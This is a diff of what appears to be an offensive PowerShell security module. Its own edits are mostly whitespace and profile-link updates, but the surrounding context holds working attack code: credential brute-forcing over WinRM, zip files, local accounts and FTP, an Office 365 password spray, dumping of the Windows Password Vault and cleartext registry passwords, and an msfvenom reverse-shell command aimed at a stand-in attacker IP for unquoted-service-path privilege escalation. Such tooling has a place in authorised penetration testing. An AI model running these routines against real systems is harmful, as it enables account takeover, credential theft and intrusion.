 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -2658,7 +2658,7 @@ System.String, System,Array
 
 .OUTPUTS
 PSCustomObject
-		
+
 #>
 Function Test-BruteForceCredentials {
     [CmdletBinding()]
@@ -2707,7 +2707,7 @@ Function Test-BruteForceCredentials {
             )]  # End Parameter
             [String]$PassFile)  # End param
 
-    
+
     If ($PSBoundParameters.Keys -eq 'Username')
     {
 
@@ -2718,17 +2718,17 @@ Function Test-BruteForceCredentials {
     }  # End If
     ElseIf ($PSBoundParameters.Keys -eq 'UserFile')
     {
-        
+
         Write-Verbose "UserFile ParameterSet being used"
 
         $UserList = Get-Content -Path $UserFile
-        ForEach ($User in $UserList) 
+        ForEach ($User in $UserList)
         {
-            
+
             $UserList += $User
-        
+
         }  # End ForEach
-            
+
 
     }  # End ElseIf
 
@@ -2747,43 +2747,43 @@ Function Test-BruteForceCredentials {
         Write-Verbose "PassFile ParameterSet being used"
 
         $PassList = Get-Content -Path $PassFile
-        ForEach ($P in $PassList) 
+        ForEach ($P in $PassList)
         {
-            
+
             $Passwd += $P
-            
+
         }  # End ForEach
 
 
     }  # End ElseIf
 
-    ForEach ($U in $UserList) 
+    ForEach ($U in $UserList)
     {
 
         Write-Verbose "Testing passwords for $U"
 
-        ForEach ($P in $PassList) 
+        ForEach ($P in $PassList)
         {
-              
+
             $Error.Clear()
-        
+
             $Credentials = @()
-          
+
             $SecurePassword = ConvertTo-SecureString -String $P -AsPlainText -Force
             $AttemptCredentials = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecurePassword)
-                
+
             If ($UseSSL.IsPresent)
             {
-                
+
                 If ($PSBoundParameters.Keys -eq "SleepSeconds")
                 {
-                    
+
                     Start-Sleep -Seconds $SleepSeconds
 
                 }  # End If
                 ElseIf ($PSBoundParameters.Keys -eq "SleepMinutes")
                 {
-                    
+
                     Start-Sleep -Seconds $SleepMinutes
 
                 }  # End ElseIf
@@ -2791,18 +2791,18 @@ Function Test-BruteForceCredentials {
                 $Result = Test-WSMan -UseSSL -ComputerName $ComputerName -Credential $AttemptCredentials -Authentication Negotiate -ErrorAction SilentlyContinue
 
             }  # End If
-            Else 
+            Else
             {
-        
+
                 If ($PSBoundParameters.Keys -eq "SleepSeconds")
                 {
-                    
+
                     Start-Sleep -Seconds $SleepSeconds
 
                 }  # End If
                 ElseIf ($PSBoundParameters.Keys -eq "SleepMinutes")
                 {
-                    
+
                     Start-Sleep -Seconds $SleepMinutes
 
                 }  # End ElseIf
@@ -2811,27 +2811,27 @@ Function Test-BruteForceCredentials {
 
             }  # End Else
 
-           If ($Null -eq $Result) 
+           If ($Null -eq $Result)
            {
-        
+
                 Write-Verbose "[*] Testing Password: $P = Failed"
-        
-            }  # End If 
-            Else 
+
+            }  # End If
+            Else
             {
-        
+
 
                 $Credentials += "USER: $U`nPASS: $P`n"
 
                 Write-Output "SUCCESS: `n$Credentials`n"
-                
-            }  # End Else       
-        
+
+            }  # End Else
+
         } # ForEach
 
     }  # End ForEach
 
-    If ($Null -eq $Credentials) 
+    If ($Null -eq $Credentials)
     {
 
         Write-Output "FAILED: None of the defined passwords were found to be correct"
@@ -2868,13 +2868,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -2914,7 +2914,7 @@ Function Test-BruteForceZipPassword {
 
     ForEach ($P in $Passwords)
     {
-        
+
         Write-Verbose "Attempting password $P"
 
         $Attempt = & "$ZipExe" e "$Path" -p"$P" -y
@@ -2922,25 +2922,25 @@ Function Test-BruteForceZipPassword {
         If ($Attempt -Contains "Everything is Ok")
         {
 
-            Try 
+            Try
             {
 
                 Write-Host "SUCCESS: $P" -ForegroundColor Green
 
             }  # End Try
-            Catch 
+            Catch
             {
 
                 Write-Output "SUCCESS: $P"
 
             }  # End Catch
-            
+
             $Result = 'False'
 
         } # Brute If
-        Else 
+        Else
         {
-            
+
             $Failed = 'True'
 
         }  # End Else
@@ -2958,7 +2958,7 @@ Function Test-BruteForceZipPassword {
 
 
 <#
-.SYNOPSIS 
+.SYNOPSIS
 This cmdlet is meant to check whether the AlwaysInstallEleveated permissions are enabled on a Windows Machine  which opens the door to privesc. It checks common registry locations for clear text credentials. It checks for weak service permissions. This checks for WSUS using HTTP to download updates which can be exploited for privilege escalation. This checks whether the fodhelper bypass method is available for admin users. This checks for unquoted service paths in the reigstry as well.
 
 
@@ -2966,10 +2966,10 @@ This cmdlet is meant to check whether the AlwaysInstallEleveated permissions are
 AlwaysInstallElevated is functionality that offers all users(especially the low privileged user) on a windows machine to run any MSI file with elevated privileges. MSI is a Microsoft based installer package file format which is used for installing, storing and removing of a program. When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).
 
 
-.EXAMPLE 
+.EXAMPLE
 Test-PrivEsc -Verbose
-# This example performs a check for common privilege escalation methods. 
-    
+# This example performs a check for common privilege escalation methods.
+
 
 .NOTES
 Author: Robert H. Osborne
@@ -2979,20 +2979,20 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
-    
+
 
 .INPUTS
 None
-    
-    
+
+
 .OUTPUTS
 None
 #>
@@ -3040,10 +3040,10 @@ Function Test-PrivEsc {
 
                 Get-Content -Path $PassFile | Select-String -Pattern "Password"
 
-            }  # End If 
+            }  # End If
 
-        }  # End ForEach 
-        
+        }  # End ForEach
+
         Write-Verbose "Checking for passwords in the Windows Password vault"
         [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }
 
@@ -3124,7 +3124,7 @@ Function Test-PrivEsc {
 
             Write-Host "Unquoted Service Path has been found" -ForegroundColor "Red"
 
-            $UnquotedServicePaths | Select-Object -Property PathName,DisplayName,Name | Format-List -GroupBy Name 
+            $UnquotedServicePaths | Select-Object -Property PathName,DisplayName,Name | Format-List -GroupBy Name
 
             Write-Host "Create a reverse shell using the following command`n`nmsfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=1337 -f exe -o msf.exe" -ForegroundColor "Yellow"
             Write-Host "Place the generated payload msf.exe into the unquoted service path location and restart the service." -ForegroundColor "Yellow"
@@ -3167,9 +3167,9 @@ Function Test-PrivEsc {
             Write-Host "This device is not vulnerable to the fodhelper UAC bypass method. `nUAC Settings: $Message" -ForegroundColor "Green"
 
         }  # End If
-        Else 
+        Else
         {
-            
+
             Write-Host "This device is vulnerable to the fodhelper bypass method. `nCurrent UAC Settings: $Message" -ForegroundColor "Yellow"
 
         }  # End Else
@@ -3215,13 +3215,13 @@ None
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 #>
@@ -3398,13 +3398,13 @@ None
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 #>
 Function Start-Bind {
@@ -3587,13 +3587,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -3873,17 +3873,17 @@ $UserNames | Invoke-AzurePasswordSpray -Passwd "Password123!" -RoundRobin
 Author: Robert H. Osborne
 Alias: tobor
 Contact: rosborne@osbornepro.com
-        
+
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -3915,7 +3915,7 @@ Function Invoke-AzurePasswordSpray {
                 HelpMessage="`n[H] Define the location of a simple text file containing a list of usernames`n[E] EXAMPLE: C:\Temp\Userlist.txt")]  # End Parameter
             [ValidateScript({Test-Path -Path $_})]
             [String[]]$UsernameFile,
-            
+
             [Parameter(
                 Position=1,
                 Mandatory=$False,
@@ -3935,18 +3935,18 @@ Function Invoke-AzurePasswordSpray {
                 ValueFromPipeline=$False)]  # End Parameter
             [ValidateSet('Basic','Modern')]
             [String]$Authentication = 'Basic',
-            
+
             [Parameter(
                 Mandatory=$False,
                 ValueFromPipeline=$False)]  # End Parameter
             [Int64]$SleepSeconds,
-            
+
             [Parameter(
                 Mandatory=$False,
                 ValueFromPipeline=$False)]  # End Parameter
             [Switch][Bool]$RoundRobin)  # End param
 
-BEGIN 
+BEGIN
 {
 
     $Obj = @()
@@ -3956,16 +3956,16 @@ BEGIN
     Switch ($Authentication)
     {
 
-        'Basic' { 
-            
-            $Uri = "https://reports.office365.com/ecp/reportingwebservice/reporting.svc" 
-        
+        'Basic' {
+
+            $Uri = "https://reports.office365.com/ecp/reportingwebservice/reporting.svc"
+
         }  # End Switch Basic
 
-        'Modern' { 
-            
+        'Modern' {
+
             Throw "[!] I have not completed this yet so this will not work. Dynamic Parameter needs to be created for 'Modern' value"
-            
+
             $DLLFile = (Get-ChildItem -Path "C:\Program Files\WindowsPowerShell\Modules\AzureAD" -Recurse -Filter 'Microsoft.IdentityModel.Clients.ActiveDirectory.dll').FullName
             Add-Type -Path $DLLFile
 
@@ -3986,17 +3986,17 @@ BEGIN
 
                         $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                         $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)
-                
-                        Try 
+
+                        Try
                         {
 
                             Invoke-WebRequest -Uri $Uri -Credential $Cred | Out-Null
                             $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}
 
                         }  # End Try
-                        Catch 
+                        Catch
                         {
-                            
+
                             Write-Verbose "$U authentication failed with password $P"
 
                         }  # End Catch
@@ -4022,14 +4022,14 @@ BEGIN
                     ForEach ($P in $PasswdList)
                     {
 
-                        Try 
+                        Try
                         {
 
                             $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                             $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)
                             $AADcredential = New-Object -TypeName "Microsoft.IdentityModel.Clients.ActiveDirectory.UserPasswordCredential" -ArgumentList $Cred.UserName,$Cred.Password
                             $AuthResult = [Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContextIntegratedAuthExtensions]::AcquireTokenAsync($AuthContext,"https://outlook.office365.com",$Client_Id,$AADcredential)
-                
+
                             $Authorization = "Bearer {0}" -f $AuthResult.Result.AccessToken
                             $Password = ConvertTo-SecureString -AsPlainText $Authorization -Force
                             $Ctoken = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $U, $Password
@@ -4037,9 +4037,9 @@ BEGIN
                             $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}
 
                         }  # End Try
-                        Catch 
+                        Catch
                         {
-                            
+
                             Write-Verbose "$U authentication failed with password $P"
 
                         }  # End Catch
@@ -4076,7 +4076,7 @@ BEGIN
         'PassFile' {
 
             Write-Verbose "PassFile being used"
-        
+
             $PassList = Get-Content -Path $PasswdFile
             ForEach ($P in $PassList)
             {
@@ -4086,13 +4086,13 @@ BEGIN
             }  # End ForEach
 
         }  # End Switch PassFile
-        
+
     }  # End Password Switch
 
     Write-Output "[*] Begining password spray"
 
 }  # End BEGIN
-PROCESS 
+PROCESS
 {
 
     Switch ($PSCmdlet.ParameterSetName)
@@ -4114,7 +4114,7 @@ PROCESS
             {
 
                 $UserList += $User
-                    
+
             }  # End ForEach
 
         }  # End Switch UserFile
@@ -4132,17 +4132,17 @@ PROCESS
 
                 $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                 $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)
-        
-                Try 
+
+                Try
                 {
 
                     Invoke-WebRequest -Uri $Uri -Credential $Cred | Out-Null
                     $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}
 
                 }  # End Try
-                Catch 
+                Catch
                 {
-                    
+
                     Write-Verbose "$U authentication failed with password $P"
 
                 }  # End Catch
@@ -4170,17 +4170,17 @@ PROCESS
 
                 $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                 $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)
-        
-                Try 
+
+                Try
                 {
 
                     Invoke-WebRequest -Uri $Uri -Credential $Cred | Out-Null
                     $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}
 
                 }  # End Try
-                Catch 
+                Catch
                 {
-                    
+
                     Write-Verbose "$U authentication failed with password $P"
 
                 }  # End Catch
@@ -4208,7 +4208,7 @@ END
         $Obj
 
     }  # End If
-    Else 
+    Else
     {
 
         Write-Output "[*] None of the user and password combinations defined were successful"
@@ -4280,14 +4280,14 @@ None
 
 .LINK
 https://roberthosborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.hackthebox.eu/profile/52286
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 #>
 Function Test-KerberosDoubleHop {
     [CmdletBinding(DefaultParameterSetName='Local')]
@@ -4373,7 +4373,7 @@ Function Test-KerberosDoubleHop {
 
             }  # End If
 
-            Invoke-Command -ArgumentList $All,$UserResults,$AdminResults,$ComputerResults -HideComputerName $ComputerName -UseSSL:$Bool -ScriptBlock { 
+            Invoke-Command -ArgumentList $All,$UserResults,$AdminResults,$ComputerResults -HideComputerName $ComputerName -UseSSL:$Bool -ScriptBlock {
 
                 $All = $Args[0]
                 $UserResults = $Args[1]
@@ -4385,7 +4385,7 @@ Function Test-KerberosDoubleHop {
 
                     Write-Verbose "Getting information on computers in the domain that are vulnerable to a Kerberos Double Hop attack"
                     $ComputerResult = Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -and (PrimaryGroupId -eq 515)} -Properties TrustedforDelegation,TrustedtoAuthForDelegation,servicePrincipalName,Description | Select-Object -Property DistinguishedName,TrustedForDelegation,TrustedtoAuthForDelegation
-                    Write-Output "[*] The above computers are vulnerable to Kerberos Hop Attack. This vulnerability allows an attacker to pivot to other machines using TGT stored on a trusted device. This can than 
+                    Write-Output "[*] The above computers are vulnerable to Kerberos Hop Attack. This vulnerability allows an attacker to pivot to other machines using TGT stored on a trusted device. This can than
                     be forwarded to a server for authentication."
 
                 }  # End If
@@ -4414,7 +4414,7 @@ Function Test-KerberosDoubleHop {
                         Get-ADUser -Identity $_ -Properties AccountNotDelegated | Where-Object {$_.AccountNotDelegated -eq $False} | Select-Object -Property DistinguishedName,AccountNotDelegated
 
                     }  # End ForEach-Object
-                    
+
                     Write-Output "[*] The above admin accounts are vulnerable to a Kerberos Double Hop"
 
                 }  # End If
@@ -4423,7 +4423,7 @@ Function Test-KerberosDoubleHop {
                 {
 
                     Write-Output "COMPUTER RESULTS"
-                    $ComputerResult 
+                    $ComputerResult
 
                 }  # End If
 
@@ -4431,7 +4431,7 @@ Function Test-KerberosDoubleHop {
                 {
 
                     Write-Output "`nUSER RESULTS"
-                    $UserResult 
+                    $UserResult
 
                 }  # End If
 
@@ -4439,7 +4439,7 @@ Function Test-KerberosDoubleHop {
                 {
 
                     Write-Output "`nADMIN RESULTS"
-                    $AdminResult 
+                    $AdminResult
 
                 }  # End If
 
@@ -4492,7 +4492,7 @@ Function Test-KerberosDoubleHop {
                         Get-ADUser -Identity $_ -Properties AccountNotDelegated | Where-Object {$_.AccountNotDelegated -eq $False} | Select-Object -Property DistinguishedName,AccountNotDelegated
 
                     }  # End ForEach-Object
-                    
+
                     Write-Output "[*] The above admin accounts are vulnerable to a Kerberos Double Hop"
 
                 }  # End If
@@ -4501,7 +4501,7 @@ Function Test-KerberosDoubleHop {
                 {
 
                     Write-Output "COMPUTER RESULTS"
-                    $ComputerResult 
+                    $ComputerResult
 
                 }  # End If
 
@@ -4509,7 +4509,7 @@ Function Test-KerberosDoubleHop {
                 {
 
                     Write-Output "`nUSER RESULTS"
-                    $UserResult 
+                    $UserResult
 
                 }  # End If
 
@@ -4517,7 +4517,7 @@ Function Test-KerberosDoubleHop {
                 {
 
                     Write-Output "`nADMIN RESULTS"
-                    $AdminResult 
+                    $AdminResult
 
                 }  # End If
 
@@ -4548,13 +4548,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -4619,13 +4619,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -4661,16 +4661,16 @@ Function Test-BruteLocalUserCredential {
 
     Write-Verbose "Adding required .NET method for Account Management"
 
-    Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
+    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
     $Type = [DirectoryServices.AccountManagement.ContextType]::Machine
     $Attempt = [DirectoryServices.AccountManagement.PrincipalContext]::New($Type)
 
     ForEach ($P in $Passwd)
     {
 
-        Try 
-        { 
-            
+        Try
+        {
+
             If (!($Attempt.ValidateCredentials($Username,$P)))
             {
 
@@ -4680,33 +4680,33 @@ Function Test-BruteLocalUserCredential {
             Else
             {
 
-                Write-Output "[*] SUCCESS: However this user does not have Sign In permissions" 
+                Write-Output "[*] SUCCESS: However this user does not have Sign In permissions"
                 $Result = New-Object -TypeName PSCustomObject -Property @{Username=$Username; Password=$P}
 
             }  # End Else
 
             If ($P -eq $Final)
             {
-                
+
                 Write-Output "[*] None of the specified credentials were successful"
 
             }  # End If
-        
+
         }  # End Try
         Catch [UnauthorizedAccessException]
-        { 
-             
+        {
+
             Write-Verbose "FAILURE: $Username : $P"
-        
+
         }  # End Catch Exception
-        Catch 
-        { 
-            
-            Write-Output "[*] SUCCESS: However this user does not have Sign In permissions" 
+        Catch
+        {
+
+            Write-Output "[*] SUCCESS: However this user does not have Sign In permissions"
             $Result = New-Object -TypeName PSCustomObject -Property @{Username=$Username; Password=$P}
 
         }  # End Catch
-        Finally 
+        Finally
         {
 
             If ($Result)
@@ -4772,13 +4772,13 @@ Contact: rosborne@osbornepro.com
 
 .LINK
 https://roberthsoborne.com
-https://osbornepro.com
+https://writeups.osbornepro.com
 https://btps-secpack.com
 https://github.com/tobor88
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
-https://www.youracclaim.com/users/roberthosborne/badges
+https://www.credly.com/users/roberthosborne/badges
 https://www.hackthebox.eu/profile/52286
 
 
@@ -4843,7 +4843,7 @@ Function Test-FTPCredential {
 
             $Request = [System.Net.FtpWebRequest]::Create($Source)
             $Request.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails
-        
+
         }  # End FTP Switch
 
         'FTPS' {
@@ -4867,7 +4867,7 @@ Function Test-FTPCredential {
         }  # End FTPES Switch
 
     }  # End Switch
-    
+
 
     ForEach ($U in $Username)
     {
